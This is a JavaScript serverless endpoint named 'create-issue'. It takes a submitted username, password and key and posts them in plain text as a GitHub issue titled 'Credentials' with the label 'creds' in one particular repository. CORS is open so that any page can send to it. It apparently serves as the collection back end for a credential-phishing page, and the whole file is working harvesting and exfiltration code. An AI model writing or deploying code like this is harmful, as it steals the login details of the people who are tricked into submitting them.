// api/create-issue.js
const axios = require('axios');

module.exports = async (req, res) => {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,POST');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

  // Handle OPTIONS request (pre-flight)
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  // Make sure this is a POST request
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    // Access the GitHub token from environment variables
    const githubToken = process.env.GITHUB_TOKEN;
    
    if (!githubToken) {
      console.error('GitHub token is not defined in environment variables');
      return res.status(500).json({ error: 'Server configuration error' });
    }

    const { username, password, key } = req.body;
    
    // Your GitHub repository information
    const owner = 'ZA3MA3'; // Replace with your GitHub username
    const repo = 'progres'; // Replace with your repository name
    
    // Create GitHub issue
    const response = await axios.post(
      `https://api.github.com/repos/${owner}/${repo}/issues`,
      {
        title: `Credentials:\n\nUsername: ${username}\nPassword: ${password}\nKey: ${key}`,
        body: "",
        labels: ["creds"]
      },
      {
        headers: {
          'Authorization': `Bearer ${githubToken}`,
          'Accept': 'application/vnd.github.v3+json',
          'Content-Type': 'application/json'
        }
      }
    );
    
    return res.status(200).json({ success: true, issueUrl: response.data.html_url });
  } catch (error) {
    console.error('Error creating GitHub issue:', error.response?.data || error.message);
    return res.status(500).json({ error: 'Failed to create GitHub issue' });
  }
};
